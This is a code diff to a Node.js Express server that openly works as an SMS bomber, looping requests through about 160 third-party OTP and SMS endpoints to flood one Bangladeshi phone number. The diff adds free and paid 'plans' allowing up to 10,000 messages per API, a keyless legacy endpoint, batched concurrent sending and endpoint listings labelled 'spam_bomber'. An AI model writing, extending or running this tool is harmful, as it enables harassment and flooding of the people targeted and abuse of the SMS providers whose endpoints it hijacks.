@@ -119,6 +119,20 @@ function cleanExpiredKeys() {
 
 setInterval(cleanExpiredKeys, 60 * 60 * 1000);
 
+// ========== PLAN CONFIGURATION ==========
+const PLAN_CONFIG = {
+  free: {
+    maxCount: 50,
+    description: "Free plan - Maximum 50 SMS per API",
+    requiresKey: false
+  },
+  premium: {
+    maxCount: 10000,
+    description: "Premium plan - Maximum 10,000 SMS per API",
+    requiresKey: true
+  }
+};
+
 // ========== 160 COMPLETE SMS APIs ==========
 const ORIGINAL_APIS = [
   // GET APIs (1-8)
@@ -505,97 +519,78 @@ function replacePhoneNumber(data, phone, count = 1) {
   return data;
 }
 
-async function sendSMS(api, phone, count = 1) {
-  try {
-    const cleanPhone = phone.replace(/[^0-9]/g, '');
-    
-    let formattedPhone = cleanPhone;
-    if (api.isShadowX || api.isLMNx9) {
-      if (formattedPhone.startsWith('880')) {
-        formattedPhone = formattedPhone.substring(3);
+// ============ SMS Sending Function with Count Support ============
+async function sendSMSWithCount(api, phone, totalCount = 1) {
+  const results = [];
+  const cleanPhone = phone.replace(/[^0-9]/g, '');
+  
+  console.log(`📤 Sending ${totalCount} SMS via ${api.name} (ID: ${api.id})`);
+  
+  for (let i = 0; i < totalCount; i++) {
+    try {
+      let formattedPhone = cleanPhone;
+      if (api.isShadowX || api.isLMNx9) {
+        if (formattedPhone.startsWith('880')) {
+          formattedPhone = formattedPhone.substring(3);
+        }
       }
+      
+      const countForUrl = api.isShadowX ? 1 : 1;
+      const url = replacePhoneNumber(api.url, formattedPhone, countForUrl);
+      
+      let config = {
+        method: api.method,
+        url: url,
+        timeout: 15000,
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        }
+      };
+
+      if (api.method === 'POST' && api.body) {
+        const body = replacePhoneNumber(api.body, formattedPhone, 1);
+        if (api.isFormData) {
+          config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+          config.data = new URLSearchParams(body).toString();
+        } else {
+          config.data = body;
+        }
+      }
+
+      const response = await axios(config);
+      results.push({
+        attempt: i + 1,
+        success: true,
+        api_id: api.id,
+        api_name: api.name,
+        status: response.status,
+        response: response.data
+      });
+      
+    } catch (error) {
+      results.push({
+        attempt: i + 1,
+        success: false,
+        api_id: api.id,
+        api_name: api.name,
+        error: error.message,
+        status: error.response?.status || null
+      });
     }
     
-    const url = replacePhoneNumber(api.url, formattedPhone, count);
-    let config = {
-      method: api.method,
-      url: url,
-      timeout: 15000,
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-      }
-    };
-
-    if (api.method === 'POST' && api.body) {
-      const body = replacePhoneNumber(api.body, formattedPhone, count);
-      if (api.isFormData) {
-        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-        config.data = new URLSearchParams(body).toString();
-      } else {
-        config.data = body;
-      }
+    if (i < totalCount - 1) {
+      await new Promise(resolve => setTimeout(resolve, 150));
     }
-
-    const response = await axios(config);
-    return {
-      success: true,
-      api_id: api.id,
-      api_name: api.name,
-      method: api.method,
-      url: url,
-      status: response.status,
-      response: response.data
-    };
-  } catch (error) {
-    return {
-      success: false,
-      api_id: api.id,
-      api_name: api.name,
-      method: api.method,
-      url: replacePhoneNumber(api.url, phone.replace(/[^0-9]/g, ''), count),
-      error: error.message,
-      status: error.response?.status || null
-    };
   }
+  
+  return results;
 }
 
-// ==================== API ENDPOINTS ====================
-
-// Root endpoint
-app.get('/', async (req, res) => {
-  const currentTime = new Date().toLocaleTimeString('en-US', {
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit',
-    hour12: true
-  });
-  
-  res.json({
-    developer: DEVELOPER_INFO,
-    total_apis: SMS_APIS.length,
-    apis: SMS_APIS.map(api => ({
-      id: api.id,
-      name: api.name,
-      method: api.method
-    })),
-    http_code: 200,
-    status: "success",
-    req_time: currentTime,
-    endpoints: {
-      generate_key: "/api/expiredate=30&createkey",
-      check_key: "/api/checkkey?key=YOUR_KEY",
-      spam_bomber: "/api/spam?number=017XXXXXXXX&count=160",
-      single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api_id=1",
-      all_apis: "/api/apis",
-      health: "/api/health"
-    }
-  });
-});
-
-// SMS SPAM ENDPOINT - NO API KEY REQUIRED
-app.get('/api/spam', async (req, res) => {
+// ============ LEGACY ENDPOINT (Old /api/spam) ============
+// এই endpoint টি এখনও কাজ করে, কিন্তু count limit 300
+app.get('/api/spam/old', async (req, res) => {
   const { number, count = 10 } = req.query;
   
   if (!number) {
@@ -603,7 +598,7 @@ app.get('/api/spam', async (req, res) => {
       success: false,
       error: 'Missing required parameter: number',
       developer: DEVELOPER_INFO,
-      usage: '/api/spam?number=017XXXXXXXX&count=160'
+      usage: '/api/spam/old?number=017XXXXXXXX&count=300'
     });
   }
   
@@ -617,22 +612,42 @@ app.get('/api/spam', async (req, res) => {
     });
   }
   
-  let limit = parseInt(count);
-  if (isNaN(limit) || limit < 1) limit = 10;
-  if (limit > SMS_APIS.length) limit = SMS_APIS.length;
+  let perApiCount = parseInt(count);
+  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
+  if (perApiCount > 300) perApiCount = 300; // Max 300 for legacy endpoint
   
-  const apisToUse = SMS_APIS.slice(0, limit);
-  const results = [];
+  const totalApis = SMS_APIS.length;
+  const allResults = [];
   
-  for (const api of apisToUse) {
-    let result;
-    if (api.isShadowX) {
-      result = await sendSMS(api, cleanNumber, Math.min(limit, 10));
-    } else {
-      result = await sendSMS(api, cleanNumber);
+  console.log(`📱 [LEGACY] Sending ${perApiCount} SMS per API to ${cleanNumber} (${totalApis} APIs total)`);
+  
+  const BATCH_SIZE = 10;
+  for (let i = 0; i < SMS_APIS.length; i += BATCH_SIZE) {
+    const batch = SMS_APIS.slice(i, i + BATCH_SIZE);
+    
+    const batchPromises = batch.map(async (api) => {
+      const apiResults = await sendSMSWithCount(api, cleanNumber, perApiCount);
+      
+      const successCount = apiResults.filter(r => r.success).length;
+      const failCount = apiResults.filter(r => !r.success).length;
+      
+      return {
+        api_id: api.id,
+        api_name: api.name,
+        method: api.method,
+        total_attempts: apiResults.length,
+        successful: successCount,
+        failed: failCount,
+        results: apiResults
+      };
+    });
+    
+    const batchResults = await Promise.all(batchPromises);
+    allResults.push(...batchResults);
+    
+    if (i + BATCH_SIZE < SMS_APIS.length) {
+      await new Promise(resolve => setTimeout(resolve, 500));
     }
-    results.push(result);
-    await new Promise(resolve => setTimeout(resolve, 500));
   }
   
   const currentTime = new Date().toLocaleTimeString('en-US', {
@@ -642,15 +657,173 @@ app.get('/api/spam', async (req, res) => {
     hour12: true
   });
   
+  let totalSuccess = 0;
+  let totalFailed = 0;
+  allResults.forEach(api => {
+    totalSuccess += api.successful;
+    totalFailed += api.failed;
+  });
+  
   res.json({
     success: true,
     developer: DEVELOPER_INFO,
     target_number: cleanNumber,
-    total_requests_sent: results.length,
-    successful_requests: results.filter(r => r.success).length,
-    failed_requests: results.filter(r => !r.success).length,
+    per_api_count: perApiCount,
+    total_apis_used: totalApis,
+    total_requests_sent: totalSuccess + totalFailed,
+    total_successful: totalSuccess,
+    total_failed: totalFailed,
+    max_count_limit: 300,
+    endpoint_type: "legacy",
+    note: "This is the old endpoint. Use /api/spam?plan=free or plan=premium for better control.",
     req_time: currentTime,
-    results: results
+    results: allResults
+  });
+});
+
+// ============ NEW: PLAN BASED SPAM ENDPOINT ============
+app.get('/api/spam', async (req, res) => {
+  const { plan, number, count = 1, key } = req.query;
+  
+  // If no plan specified, redirect to legacy behavior (max 300)
+  if (!plan) {
+    // Redirect to old endpoint with count limit 300
+    const countParam = Math.min(parseInt(count) || 10, 300);
+    return res.redirect(`/api/spam/old?number=${number}&count=${countParam}`);
+  }
+  
+  // Validate plan
+  if (!PLAN_CONFIG[plan]) {
+    return res.status(400).json({
+      success: false,
+      error: `Invalid plan: ${plan}. Available plans: free, premium`,
+      developer: DEVELOPER_INFO,
+      available_plans: Object.keys(PLAN_CONFIG),
+      legacy_endpoint: '/api/spam/old?number=017XXXXXXXX&count=300'
+    });
+  }
+  
+  const planConfig = PLAN_CONFIG[plan];
+  
+  // Check if key is required for premium
+  if (planConfig.requiresKey) {
+    if (!key) {
+      return res.status(401).json({
+        success: false,
+        error: 'API key required for premium plan. Get your key at /api/expiredate=30&createkey',
+        developer: DEVELOPER_INFO
+      });
+    }
+    
+    if (!isKeyValid(key)) {
+      return res.status(401).json({
+        success: false,
+        error: 'Invalid or expired API key',
+        developer: DEVELOPER_INFO
+      });
+    }
+  }
+  
+  // Validate number
+  if (!number) {
+    return res.status(400).json({
+      success: false,
+      error: 'Missing required parameter: number',
+      developer: DEVELOPER_INFO,
+      usage: `/api/spam?plan=${plan}&number=017XXXXXXXX&count=${planConfig.maxCount}`
+    });
+  }
+  
+  const cleanNumber = number.replace(/[^0-9]/g, '');
+  const phoneRegex = /^(01|8801)[0-9]{9}$/;
+  if (!phoneRegex.test(cleanNumber)) {
+    return res.status(400).json({
+      success: false,
+      error: 'Invalid phone number. Use format: 017XXXXXXXX or 88017XXXXXXXX',
+      developer: DEVELOPER_INFO
+    });
+  }
+  
+  // Validate count based on plan
+  let perApiCount = parseInt(count);
+  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
+  if (perApiCount > planConfig.maxCount) {
+    return res.status(400).json({
+      success: false,
+      error: `Count exceeds plan limit. ${plan} plan allows maximum ${planConfig.maxCount} per API`,
+      developer: DEVELOPER_INFO,
+      plan: plan,
+      max_allowed: planConfig.maxCount,
+      requested: perApiCount
+    });
+  }
+  
+  const totalApis = SMS_APIS.length;
+  const allResults = [];
+  
+  console.log(`📱 [${plan.toUpperCase()} PLAN] Sending ${perApiCount} SMS per API to ${cleanNumber} (${totalApis} APIs total)`);
+  console.log(`📊 Total SMS: ${totalApis * perApiCount}`);
+  
+  // Process APIs in batches
+  const BATCH_SIZE = 10;
+  for (let i = 0; i < SMS_APIS.length; i += BATCH_SIZE) {
+    const batch = SMS_APIS.slice(i, i + BATCH_SIZE);
+    
+    const batchPromises = batch.map(async (api) => {
+      console.log(`🔄 Processing API ${api.id}: ${api.name} (${perApiCount} times)`);
+      const apiResults = await sendSMSWithCount(api, cleanNumber, perApiCount);
+      
+      const successCount = apiResults.filter(r => r.success).length;
+      const failCount = apiResults.filter(r => !r.success).length;
+      
+      return {
+        api_id: api.id,
+        api_name: api.name,
+        method: api.method,
+        total_attempts: apiResults.length,
+        successful: successCount,
+        failed: failCount,
+        results: apiResults
+      };
+    });
+    
+    const batchResults = await Promise.all(batchPromises);
+    allResults.push(...batchResults);
+    
+    if (i + BATCH_SIZE < SMS_APIS.length) {
+      await new Promise(resolve => setTimeout(resolve, 500));
+    }
+  }
+  
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+  
+  let totalSuccess = 0;
+  let totalFailed = 0;
+  allResults.forEach(api => {
+    totalSuccess += api.successful;
+    totalFailed += api.failed;
+  });
+  
+  res.json({
+    success: true,
+    developer: DEVELOPER_INFO,
+    plan: plan,
+    plan_description: planConfig.description,
+    target_number: cleanNumber,
+    per_api_count: perApiCount,
+    total_apis_used: totalApis,
+    total_requests_sent: totalSuccess + totalFailed,
+    total_successful: totalSuccess,
+    total_failed: totalFailed,
+    plan_limit: planConfig.maxCount,
+    key_used: key || null,
+    req_time: currentTime,
+    results: allResults
   });
 });
 
@@ -671,7 +844,8 @@ app.get('/api/expiredate=30&createkey', (req, res) => {
     developer: DEVELOPER_INFO,
     message: "API key generated successfully. Valid for 30 days.",
     saved_to_file: saved,
-    note: "Save this key! It won't be shown again."
+    note: "Save this key! It won't be shown again.",
+    premium_access: "Use this key for premium plan: /api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=10000"
   });
 });
 
@@ -696,19 +870,21 @@ app.get('/api/checkkey', (req, res) => {
     api_key: key,
     expiry_date: expiryDate ? expiryDate.toISOString() : null,
     status: isValid ? 'active' : 'invalid or expired',
-    developer: DEVELOPER_INFO
+    developer: DEVELOPER_INFO,
+    can_use_premium: isValid
   });
 });
 
 // Single API SMS send (Requires Key)
 app.get('/api/send', async (req, res) => {
-  const { key, number, api_id, count } = req.query;
+  const { key, number, api_id, count = 1 } = req.query;
   
   if (!key || !number || !api_id) {
     return res.status(400).json({
       success: false,
       error: 'Missing required parameters: key, number, and api_id',
-      developer: DEVELOPER_INFO
+      developer: DEVELOPER_INFO,
+      usage: '/api/send?key=YOUR_KEY&number=017XXXXXXXX&api_id=1&count=5'
     });
   }
   
@@ -729,13 +905,20 @@ app.get('/api/send', async (req, res) => {
     });
   }
   
-  let result;
-  if (api.isShadowX) {
-    const countParam = parseInt(count) || 1;
-    result = await sendSMS(api, number, Math.min(countParam, 10));
-  } else {
-    result = await sendSMS(api, number);
+  let perApiCount = parseInt(count);
+  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
+  if (perApiCount > PLAN_CONFIG.premium.maxCount) {
+    return res.status(400).json({
+      success: false,
+      error: `Count exceeds maximum limit. Maximum allowed: ${PLAN_CONFIG.premium.maxCount}`,
+      developer: DEVELOPER_INFO
+    });
   }
+  
+  const results = await sendSMSWithCount(api, number, perApiCount);
+  
+  const successCount = results.filter(r => r.success).length;
+  const failCount = results.filter(r => !r.success).length;
   
   const currentTime = new Date().toLocaleTimeString('en-US', {
     hour: '2-digit',
@@ -749,8 +932,13 @@ app.get('/api/send', async (req, res) => {
     developer: DEVELOPER_INFO,
     target_number: number,
     api_used: api.name,
+    api_id: api.id,
+    total_attempts: results.length,
+    successful: successCount,
+    failed: failCount,
+    max_count_limit: PLAN_CONFIG.premium.maxCount,
     req_time: currentTime,
-    result: result
+    results: results
   });
 });
 
@@ -767,22 +955,38 @@ app.get('/api/apis', (req, res) => {
     developer: DEVELOPER_INFO,
     all_apis: SMS_APIS,
     total_apis: SMS_APIS.length,
+    plans: {
+      free: {
+        max_count: PLAN_CONFIG.free.maxCount,
+        requires_key: PLAN_CONFIG.free.requiresKey
+      },
+      premium: {
+        max_count: PLAN_CONFIG.premium.maxCount,
+        requires_key: PLAN_CONFIG.premium.requiresKey
+      },
+      legacy: {
+        max_count: 300,
+        requires_key: false,
+        endpoint: '/api/spam/old?number=017XXXXXXXX&count=300'
+      }
+    },
     http_code: 200,
     status: "success",
     req_time: currentTime
   });
 });
 
-// Get specific API by ID (Requires Key)
+// Specific API by ID (Requires Key)
 app.get('/api/api/:id', async (req, res) => {
-  const { key, number, count } = req.query;
+  const { key, number, count = 1 } = req.query;
   const apiId = parseInt(req.params.id);
   
   if (!key || !number) {
     return res.status(400).json({
       success: false,
       error: 'Missing required parameters: key and number',
-      developer: DEVELOPER_INFO
+      developer: DEVELOPER_INFO,
+      usage: '/api/api/1?key=YOUR_KEY&number=017XXXXXXXX&count=5'
     });
   }
   
@@ -803,13 +1007,20 @@ app.get('/api/api/:id', async (req, res) => {
     });
   }
   
-  let result;
-  if (api.isShadowX) {
-    const countParam = parseInt(count) || 1;
-    result = await sendSMS(api, number, Math.min(countParam, 10));
-  } else {
-    result = await sendSMS(api, number);
+  let perApiCount = parseInt(count);
+  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
+  if (perApiCount > PLAN_CONFIG.premium.maxCount) {
+    return res.status(400).json({
+      success: false,
+      error: `Count exceeds maximum limit. Maximum allowed: ${PLAN_CONFIG.premium.maxCount}`,
+      developer: DEVELOPER_INFO
+    });
   }
+  
+  const results = await sendSMSWithCount(api, number, perApiCount);
+  
+  const successCount = results.filter(r => r.success).length;
+  const failCount = results.filter(r => !r.success).length;
   
   const currentTime = new Date().toLocaleTimeString('en-US', {
     hour: '2-digit',
@@ -823,8 +1034,13 @@ app.get('/api/api/:id', async (req, res) => {
     developer: DEVELOPER_INFO,
     target_number: number,
     api_used: api.name,
+    api_id: api.id,
+    total_attempts: results.length,
+    successful: successCount,
+    failed: failCount,
+    max_count_limit: PLAN_CONFIG.premium.maxCount,
     req_time: currentTime,
-    result: result
+    results: results
   });
 });
 
@@ -883,6 +1099,23 @@ app.get('/api/health', (req, res) => {
     valid_keys: validCount,
     keys_file_location: KEYS_FILE,
     is_render: !!process.env.RENDER,
+    plans: {
+      free: {
+        max_count: PLAN_CONFIG.free.maxCount,
+        requires_key: PLAN_CONFIG.free.requiresKey,
+        description: PLAN_CONFIG.free.description
+      },
+      premium: {
+        max_count: PLAN_CONFIG.premium.maxCount,
+        requires_key: PLAN_CONFIG.premium.requiresKey,
+        description: PLAN_CONFIG.premium.description
+      },
+      legacy: {
+        max_count: 300,
+        requires_key: false,
+        endpoint: '/api/spam/old?number=017XXXXXXXX&count=300'
+      }
+    },
     api_breakdown: {
       original_apis: 49,
       shadowx_api: 1,
@@ -893,9 +1126,11 @@ app.get('/api/health', (req, res) => {
       root: "/",
       generate_key: "/api/expiredate=30&createkey",
       check_key: "/api/checkkey?key=YOUR_KEY",
-      spam_bomber: "/api/spam?number=017XXXXXXXX&count=160",
-      single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api_id=1",
-      specific_api: "/api/api/1?key=YOUR_KEY&number=017XXXXXXXX",
+      legacy_spam: "/api/spam/old?number=017XXXXXXXX&count=300",
+      spam_free: "/api/spam?plan=free&number=017XXXXXXXX&count=50",
+      spam_premium: "/api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=10000",
+      single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api_id=1&count=5",
+      specific_api: "/api/api/1?key=YOUR_KEY&number=017XXXXXXXX&count=5",
       all_apis: "/api/apis",
       admin_keys: "/api/admin/keys"
     }
@@ -928,17 +1163,12 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`👨‍💻 Developer: ${DEVELOPER_INFO.developer}`);
   console.log(`📱 Telegram: ${DEVELOPER_INFO.telegram}`);
   console.log(`📡 Total SMS APIs: ${SMS_APIS.length}`);
-  console.log(`   - Original APIs: 49`);
-  console.log(`   - ShadowX API: 1`);
-  console.log(`   - LMNx9 APIs: 110`);
-  console.log(`💾 Keys file: ${KEYS_FILE}`);
+  console.log(`\n📊 AVAILABLE ENDPOINTS:`);
+  console.log(`   🔓 LEGACY: /api/spam/old?number=017XXXXXXXX&count=300 (Max 300, No Key)`);
+  console.log(`   🔓 FREE: /api/spam?plan=free&number=017XXXXXXXX&count=50 (Max 50, No Key)`);
+  console.log(`   🔒 PREMIUM: /api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000 (Max 10000)`);
+  console.log(`\n💾 Keys file: ${KEYS_FILE}`);
   console.log(`📋 Loaded ${validKeys.size} saved API keys`);
   console.log(`🖥️ Running on Render: ${!!process.env.RENDER}`);
-  console.log(`\n🔓 FREE API ENDPOINT (No Key Required):`);
-  console.log(`   GET /api/spam?number=017XXXXXXXX&count=160\n`);
-  console.log(`📌 Quick Start:`);
-  console.log(`   Generate Key: /api/expiredate=30&createkey`);
-  console.log(`   Check Key: /api/checkkey?key=YOUR_KEY`);
-  console.log(`   View APIs: /api/apis`);
-  console.log(`   Health Check: /api/health\n`);
+  console.log(`\n✅ All endpoints active!`);
 });
